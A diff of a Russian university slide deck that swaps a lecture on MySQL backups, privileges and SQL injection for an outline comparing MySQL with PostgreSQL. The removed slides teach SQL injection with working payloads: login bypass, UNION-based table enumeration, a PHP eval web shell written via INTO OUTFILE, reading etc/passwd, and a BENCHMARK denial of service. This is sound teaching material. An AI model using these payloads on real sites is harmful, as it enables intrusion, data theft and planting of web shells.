@@ -1,295 +1,39 @@
 ---
 title: Лекция 9
 description: |
-  Тема данной лекции:
+  Сравнение с MySQL.
 
-   - Резервное копирование;
-   - Права доступа;
-   - SQL-injection.
-draft: true
+  - Архитектура MySQL:
+    - Модульность и подключаемые хранилища;
+    - Обзор основных хранилищ (MyISAM, InnoDB, Memory);
+    - Особенности получения результата SELECT-а;
+    - Особенности репликации и лога запросов.
+  - Особенности планировщика запросов;
+  - Функционал, отсутствующий в PostgreSQL:
+    - Партиционирование;
+    - COLLATION;
+    - libslave.
+  - Базовые параметры при конфигурировании MySQL.
 ---
 <section class="slide">
-<h2>Резервное копирование: Зачем?</h2>
-<img src="backup.png" style="float: right; height: 430px; border: 1px solid black" />
-<ul>
-	<li>Восстановление после аварии</li>
-	<li>Человек передумал</li>
-	<li>Аудит</li>
-	<li>Тестирование</li>
-</ul>
-</section>
-
-<section class="slide">
-<h2>Логические резервные копии</h2>
-<ul>
-	<li>Это обычные файлы, которые можно обрабатывать с помощью стандартных текстовых редакторов.</li>
-	<li>Из них легко восстанавливать данные. Достаточно просто подать файл по конвейеру на вход программы mysql или воспользоваться программой mysqlimport.</li>
-	<li>Резервное копирование и возврат данных можно выполнять по сети, то есть не на той же машине, где работает сервер MySQL.</li>
-	<li>Процедуру можно очень гибко настраивать.</li>
-	<li>Они не зависят от подсистемы хранения.</li>
-	<li>Они могут помочь избежать повреждения данных.</li>
-</ul>
-</section>
-
-<section class="slide">
-<h2>Логические резервные копии</h2>
-<ul>
-	<li>Для их генерации требуется работа сервера, так что процессор загружается сильнее.</li>
-	<li>В некоторых случаях логические копии оказываются объемнее исходных физических файлов. Зачастую логические копии хорошо поддаются сжатию, но для этого нужно дополнительное процессорное время.</li>
-	<li>Потеря точности в представлении чисел с плавающей точкой может помешать правильному восстановлению данных из файлов дампа.</li>
-	<li>Для восстановления данных из логической копии необходимо загружать и интерпретировать команды и перестраивать индексы, что возлагает на сервер еще больше работы.</li>
-</ul>
-</section>
-
-<section class="slide">
-<h2>Физические резервные копии</h2>
-<ul style="font-size: 90%">
-	<li>Для получения физической копии нужно просто скопировать требуемые файлы в другое место. Никакой дополнительной работы для их генерации выполнять не придется.</li>
-	<li>Трудоемкость возврата данных из физической копии может быть проще и зависит от подсистемы хранения. В случае MyISAM достаточно просто скопировать файлы в исходное место.</li>
-	<li>Физические копии можно переносить между платформами, операционными системами и версиями MySQL.</li>
-	<li>Восстановление с физических копий может оказаться быстрее, потому что серверу не нужно выполнять SQL-команды и строить индексы. При наличии таблиц InnoDB, которые не помещаются целиком в память сервера, восстановление данных из физических файлов может быть гораздо быстрее.</li>
-</ul>
-</section>
-
-<section class="slide">
-<h2>Физические резервные копии</h2>
-<ul>
-	<li>Объем физических файлов InnoDB, как правило, гораздо больше соответствующих логических копий. Обычно в табличном пространстве InnoDB очень много неиспользуемого места. К тому же какое-то пространство отведено под цели, не связанные с хранением табличных данных (буфер вставки, сегмент отката и т. д.).</li>
-	<li>Не всегда физическую копию можно перенести на другую платформу, операционную систему или версию MySQL. В частности, препятствием может стать чувствительность к регистру букв и формат чисел с плавающей точкой. Перенос файлов в систему с другим форматом чисел с плавающей точкой вообще невозможен.</li>
-</ul>
-</section>
-
-<section class="slide">
-<h2>Что копировать?</h2>
-<dl style="font-size: 90%">
-	<dt>Неочевидные данные</dt>
-	<dd>Не забудьте о данных, которые не бросаются в глаза, например: двоичные журналы и журналы транзакций InnoDB.</dd>
-
-	<dt>Код</dt>
-	<dd>В частности, триггеры и хранимые процедуры.</dd>
-
-	<dt>Конфигурация репликации</dt>
-	<dd>Для восстановления сервера, участвующего в репликации, следует включать в резервную копию все необходимые для репликации файлы.</dd>
-
-	<dt>Конфигурация сервера</dt>
-	<dd>Если потребуется восстановить данные после настоящей катастрофы.</dd>
-
-	<dt>Отдельные файлы операционной системы</dt>
-	<dd>На UNIX-сервере это могут быть таблицы cron, конфигурация пользователей и групп и правила sudo.</dd>
-</dl>
-</section>
-
-<section class="slide">
-<h2>Терминология</h2>
-<dl>
-	<dt>Аутентификация</dt>
-	<dd>Кто вы такой?</dd>
-
-	<dt>Авторизация</dt>
-	<dd>Что вам разрешено делать?</dd>
-
-	<dt>Контроль доступа</dt>
-	<dd>Какие данные вам разрешено видеть и/или изменять?</dd>
-
-	<dt>Привилегии и разрешения</dt>
-	<dd>Способ представления в MySQL права доступа.
-		<p><dfn>Объектные привилегии</dfn> разрешают доступ к конкретным объектам.</p>
-		<p><dfn>Глобальные привилегии</dfn> позволяют что-то делать с самим сервером.</p>
-	</dd>
-</dl>
-</section>
-
-<section class="slide">
-<h2>Таблицы доступа</h2>
-<dl style="font-size: 80%">
-	<dt>user</dt>
-	<dd>В каждой строке хранятся учетные данные пользователя (имя, местоположение и зашифрованный пароль) и его глобальные привилегии.</dd>
-
-	<dt>db</dt>
-	<dd>В каждой строке хранятся привилегии уровня базы данных для одного пользователя.</dd>
-
-	<dt>host</dt>
-	<dd>В каждой строке хранятся привилегии доступа к одной базе данных для пользователя, подключающегося из заданного местоположения.</dd>
-
-	<dt>tables_priv</dt>
-	<dd>В каждой строке хранятся привилегии доступа одного пользователя к одной таблице.</dd>
-
-	<dt>columns_priv</dt>
-	<dd>В каждой строке хранятся привилегии доступа одного пользователя к одному столбцу.</dd>
-
-	<dt>procs_priv</dt>
-	<dd>В каждой строке представлены привилегии доступа одного пользователя к одной хранимой подпрограмме (процедуре или функции).</dd>
-</dl>
-</section>
-
-<section class="slide">
-<h2>Таблицы доступа</h2>
-<div style="text-align: center; height: 100%">
-	<img style="height: 70%" src="authorization.png" />
-</div>
-</section>
-
-<section class="slide">
-<h2>Привелегии</h2>
-<pre><code class="sql" style="font-size: 85%">GRANT [privileges] ON [objects] TO [user];
-GRANT [privileges] ON [objects] TO [user] IDENTIFIED BY [password];
-REVOKE [privileges] ON [objects] FROM [user];
-</code></pre>
-<div style="text-align: center; height: 55%; margin-top: 30px">
-	<img style="height: 100%" src="password.jpg" />
-</div>
-</section>
-
-<section class="slide">
-<h2>Виды записей</h2>
-<ul style="font-size: 70%" class="compact">
-	<li>Учетная запись системного администратора
-	<pre><code class="sql">GRANT ALL PRIVILEGES ON *.* TO root@localhost
-IDENTIFIED BY 'p4ssword' WITH GRANT OPTION;</code></pre>
-	</li>
-	<li>Учетные записи администраторов базы данных (АБД)
-	<pre><code class="sql">GRANT ALL PRIVILEGES ON *.* TO john@localhost
-IDENTIFIED BY 'p4ssword' WITH GRANT OPTION;</code></pre>
-	</li>
-	<li>Учетные записи для сотрудников
-	<pre><code class="sql">GRANT INSERT, UPDATE ON widgets.orders TO 'tera'@'%.widgets.example.com'
-IDENTIFIED BY 'p4ssword';</code></pre>
-	</li>
-	<li>Доступ только для протоколирования
-	<pre><code class="sql">GRANT INSERT ON logs.* TO 'logger'@'%.widgets.example.com'
-IDENTIFIED BY 'p4ssword';</code></pre>
-	</li>
-	<li>Резервное копирование
-	<pre><code class="sql">GRANT SELECT, LOCK TABLES, FILE ON *.* TO 'backup'@'localhost'
-IDENTIFIED BY 'p4ssword';</code></pre>
-	</li>
-	<li>Эксплуатация и мониторинг
-	<pre><code class="sql">GRANT PROCESS, SHUTDOWN on *.* TO 'noc'@'monitorserver.noc.example.com'
-IDENTIFIED BY 'p4ssword';</code></pre>
-	</li>
-</section>
-
-<section class="slide">
-<h2>Отзыв привилегий</h2>
-<pre><code class="sql" style="font-size: 85%">GRANT SELECT ON *.* TO 'homer' IDENTIFIED BY 'Simps0n';
- 
-REVOKE SELECT ON sakila.film FROM 'homer';
--- ERROR 1147 (42000): There is no such grant defined
--- for user 'homer' on host '%' on table 'film'
-
-GRANT SELECT ON sakila.* TO 'homer';
-
-REVOKE ALL PRIVILEGES ON sakila.* FROM 'homer';
-
-DROP USER 'homer';
-</code></pre>
-</section>
-
-<section class="slide">
-<h2>SQL-injection: Строковой параметр</h2>
-<ul>
-	<li>http://xxx/news.php?id=1
-	<pre><code class="sql">SELECT * FROM news WHERE id='<mark>$id</mark>'</code></pre>
-	</li>
-	<li>http://xxx/news.php?id=1'
-	<pre><code class="sql">SELECT * FROM news WHERE id='<mark>1'</mark>'
-</code></pre>
-	mysql_query(): You have an error in your SQL syntax check the manual that corresponds to your MySQL server version for the right syntax to use near '1''
-	</li>
-	<li>http://xxx/news.php?id=1'%20--%20
-	<pre><code class="sql">SELECT * FROM news WHERE id='<mark>1' -- </mark>'
-</code></pre>
-	</li>
-</section>
-
-<section class="slide">
-<h2>SQL-injection: Авторизация</h2>
-<div style="font-size: 90%">
-<pre><code class="sql">SELECT * FROM users
-WHERE login='<mark>$login</mark>' AND pass='<mark>$pass</mark>'</code></pre>
-<pre><code class="sql">
-SELECT * FROM users
-WHERE login='<mark>Admin' -- </mark>' AND pass='<mark>123</mark>'
-</code></pre>
-<pre><code class="sql">
-
-  
-SELECT * FROM users
-WHERE login='<mark>Admin</mark>' AND pass='<mark>123' OR login='Admin' -- </mark>'
-</code></pre>
-<pre><code class="sql">
-SELECT * FROM users
-WHERE (login='Admin' AND pass='123') OR (login='Admin')
-</code></pre>
-</div>
-</section>
-
-<section class="slide">
-<h2>Оператор LIKE</h2>
-<pre><code class="sql">SELECT * FROM users
-WHERE login LIKE 'Admin' AND pass LIKE '123'
-</code></pre>
-<pre><code class="sql">
-SELECT * FROM users
-WHERE login LIKE 'Admin' AND pass LIKE '%'
-</code></pre>
-</section>
-
-<section class="slide">
-<h2>SQL-injection: UNION</h2>
-<ul>
-	<li>http://xxx/news.php?id=1' UNION SELECT 1, 2 --
-	<pre><code class="sql">SELECT * FROM news WHERE id='1' UNION SELECT 1 --</code></pre>
-	Ошибка. «The used SELECT statements have a different number of columns»</li>
-
-	<li>http://xxx/news.php?id=1' UNION SELECT 1, 2 --<br/>
-	Ошибка. «The used SELECT statements have a different number of columns»</li>
-
-	<li>http://xxx/news.php?id=1' UNION SELECT 1,2,3 --<br/>
-	Опять ошибка.</li>
-
-	<li>http://xxx/news.php?id=1' UNION SELECT 1,2,3,4,5,6 --<br/>
-	О! Отобразилось точно также как и http://xxx/news.php?id=1</li>
-</ul>
-</section>
-
-<section class="slide">
-<h2>SQL-injection: GROUP BY/ORDER BY</h2>
-<ul>
-	<li>http://xxx/news.php?id=1' GROUP BY 2 --</li>
-	<li>http://xxx/news.php?id=1' GROUP BY 10 --<br/>
-	mysql_query(): Unknown column '10' in 'group statement'</li>
-	<li>http://xxx/news.php?id=1' GROUP BY 5 --</li>
-	<li>http://xxx/news.php?id=1' GROUP BY 7 --<br/>
-	mysql_query(): Unknown column '7' in 'group statement'</li>
-	<li>http://xxx/news.php?id=1' GROUP BY 6 --</li>
-</ul>
-</section>
-
-<section class="slide">
-<h2>SQL-injection: INFORMATION_SCHEMA</h2>
-<ul style="font-size: 90%">
-	<li>http://xxx/news.php?id=-1' UNION SELECT 1,2,3,TABLE_NAME ,5,6 FROM INFORMATION_SCHEMA.TABLES --</li>
-	<li>http://xxx/news.php?id=-1' UNION SELECT 1,2,3,TABLE_NAME ,5,6 FROM INFORMATION_SCHEMA.TABLES LIMIT 0,1 --</li>
-	<li>http://xxx/news.php?id=-1' UNION SELECT 1,2,3, COLUMN_NAME,5,6 FROM INFORMATION_SCHEMA.COLUMNS WHERE TABLE_NAME=’Users’ LIMIT 0,1 --</li>
-	<li>http://xxx/news.php?id=-1' UNION SELECT 1,2,3, COLUMN_NAME,5,6 FROM INFORMATION_SCHEMA.COLUMNS WHERE TABLE_NAME='Users' LIMIT 1,1 --</li>
-</ul>
-</section>
-
-<section class="slide">
-<h2>SQL-injection: Работа с файлами</h2>
-<ul style="font-size: 90%">
-	<li>http://xxx/news.php?id=-1' UNION SELECT 1,2,3,4,5,6 INTO OUTFILE '1.txt' --</li>
-	<li>http://xxx/news.php?id=-1' UNION SELECT 1,2,3,'<?php eval($_GET[‘e’]) ?>',5,6 INTO OUTFILE '1.php' --</li>
-	<li>http://xxx/news.php?id=-1' UNION SELECT 1,2,LOAD_FILE('etc/passwd'),4,5,6</li>
-</ul>
-</section>
-
-<section class="slide">
-<h2>SQL-injection: DOS ататка</h2>
-<pre><code class="sql" style="font-size: 90%">SELECT BENCHMARK(100000,md5(current_time));
-
-SELECT BENCHMARK(100000,BENCHMARK(100000,md5(current_time)));
-</code></pre>
-<p>http://xxx/news.php?id=-1' UNION SELECT 1, 2, BENCHMARK(100000,BENCHMARK(100000,md5(current_time ))), 4, 5, 6 --</p>
+    <h2>Сравнение с MySQL</h2>
+    <ul>
+        <li>Архитектура MySQL:
+            <ul>
+                <li>Модульность и подключаемые хранилища;</li>
+                <li>Обзор основных хранилищ (MyISAM, InnoDB, Memory);</li>
+                <li>Особенности получения результата SELECT-а;</li>
+                <li>Особенности репликации и лога запросов.</li>
+            </ul>
+        </li>
+        <li>Особенности планировщика запросов;</li>
+        <li>Функционал, отсутствующий в PostgreSQL:
+            <ul>
+                <li>Партиционирование;</li>
+                <li>COLLATION;</li>
+                <li>libslave.</li>
+            </ul>
+        </li>
+        <li>Базовые параметры при конфигурировании MySQL.</li>
+    </ul>
 </section>
